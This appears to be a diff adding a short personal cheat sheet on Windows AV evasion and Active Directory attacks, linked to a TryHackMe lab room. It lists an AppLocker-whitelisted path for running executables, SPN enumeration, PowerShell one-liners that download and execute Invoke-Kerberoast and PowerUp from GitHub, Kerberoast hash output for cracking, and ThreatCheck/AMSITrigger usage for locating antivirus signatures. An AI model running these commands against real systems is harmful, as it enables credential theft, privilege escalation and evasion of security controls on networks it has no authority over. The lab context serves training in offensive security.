@@ -1,0 +1,37 @@
+### av-evasion ###
+## links
+https://tryhackme.com/room/corp
+
+
+## app locker (which exe you could launch based on path)
+C:\Windows\System32\spool\drivers\color						# it is by default a whitelisted dir
+
+
+TODO
+## extract all SPN account
+setspn -T medin -Q ​ */*
+
+
+## get kerberoast script
+PS> iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+PS> Invoke-Kerberoast -OutputFormat hashcat ​ |fl
+PS> Invoke-Kerberoast -OutputFormat john ​ |fl
+
+
+## powershell enum
+PS> iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1')
+PS> Import-Module PowerUp.ps1
+PS> . .\PowerUp.ps1
+PS> Invoke-AllChecks
+
+
+## ThreatCheck
+PS> .\ThreatCheck.exe -f 'C:\path\to\bin.exe' -e AMSI				# check first byte trigger AV
+PS> .\amsitrigger.exe --help
+PS> .\amsitrigger.exe -i bypass.ps1 -f 3					# underline PS1 trigger string
+
+
+
+
+
+
